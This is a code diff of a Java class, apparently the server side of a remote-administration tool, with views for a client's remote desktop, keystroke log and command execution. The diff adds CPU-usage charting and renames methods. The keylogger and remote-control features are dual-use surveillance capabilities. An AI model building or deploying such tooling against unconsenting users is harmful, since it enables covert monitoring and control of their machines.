@@ -1,10 +1,17 @@
 package Server;
 
 import Server.Exception.ClientDisconnectedException;
-import Server.GUI.*;
+import Server.GUI.GuiCommand;
+import Server.GUI.GuiDesktop;
+import Server.GUI.GuiKeyLogger;
+import Server.GUI.GuiText;
+import UI.CPU_Usage;
 import Ultils.MessageType;
 import Ultils.NetUtils;
 import Ultils.Packet;
+import org.jfree.data.time.DynamicTimeSeriesCollection;
+import org.jfree.data.time.Second;
+import oshi.SystemInfo;
 
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
@@ -14,9 +21,13 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketException;
+import java.time.LocalDateTime;
+import java.time.ZoneId;
 import java.util.Base64;
+import java.util.Date;
 
 import javax.imageio.ImageIO;
+import javax.swing.*;
 
 
 public class ConnectedClient{
@@ -31,7 +42,6 @@ public class ConnectedClient{
     private GuiDesktop desktop;
     private GuiKeyLogger keylogger;
     private GuiCommand command;
-    private GuiCPU cpu;
 
     public ConnectedClient(Socket socket) throws IOException {
         this.lastIP = socket.getInetAddress().getHostAddress();
@@ -66,7 +76,32 @@ public class ConnectedClient{
                     this.os = packet.data.get(0);
                     this.userName = packet.data.get(1);
                     Server.getInstance().getGUI().updateInfo();
+
                 } else if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
+
+                    SystemInfo si = new SystemInfo();
+                    CPU_Usage cpu_usage = new CPU_Usage(si);
+
+                    Date date = Date.from(LocalDateTime.now().atZone(ZoneId.systemDefault()).toInstant());
+                    DynamicTimeSeriesCollection sysData = new DynamicTimeSeriesCollection(1, 60, new Second());
+                    sysData.setTimeBase(new Second(date));
+                    sysData.addSeries(CPU_Usage.floatArrayPercent(Double.parseDouble(packet.data.get(0))),0, "All cpu");
+
+                    double[] procUsage = new double[packet.data.size() - 1];
+                    for (int i = 0; i < procUsage.length; ++i)
+                    {
+                        procUsage[i] = Double.parseDouble(packet.data.get(i + 1));
+                    }
+
+                    DynamicTimeSeriesCollection procData = new DynamicTimeSeriesCollection(procUsage.length, 60, new Second());
+                    procData.setTimeBase(new Second(date));
+
+                    for (int i = 0; i < procUsage.length; i++) {
+                        procData.addSeries(CPU_Usage.floatArrayPercent(procUsage[i]), i, "cpu" + i);
+                    }
+
+                    Timer timer = cpu_usage.UpdateUsage(si.getHardware().getProcessor(),sysData,procData);
+                    timer.start();
 
                 } else if (packet.action == MessageType.COMMAND.getID()) {
                     if (command == null) {
@@ -108,32 +143,25 @@ public class ConnectedClient{
         Server.getInstance().removeClient(this);
     }
 
-    public void OpenDesktopView() {
+    public void openDesktopView() {
         if (this.desktop == null) {
             this.desktop = new GuiDesktop(this);
         }
         this.desktop.setVisible(true);
     }
 
-    public void OpenKeyLogView() {
+    public void openKeyLogView() {
         if (this.keylogger == null) {
             this.keylogger = new GuiKeyLogger(this);
         }
         this.keylogger.setVisible(true);
     }
 
-    public void OpenCommandView() {
+    public void openCommandView() {
         if (this.command == null) {
             this.command = new GuiCommand(this);
         }
         this.command.setVisible(true);
-    }
-
-    public void OpenCpuView() {
-        if (this.cpu == null) {
-            this.cpu = new GuiCPU(this);
-        }
-        this.cpu.setVisible(true);
     }
 
     public void SendShutDown(PrintWriter pw) {
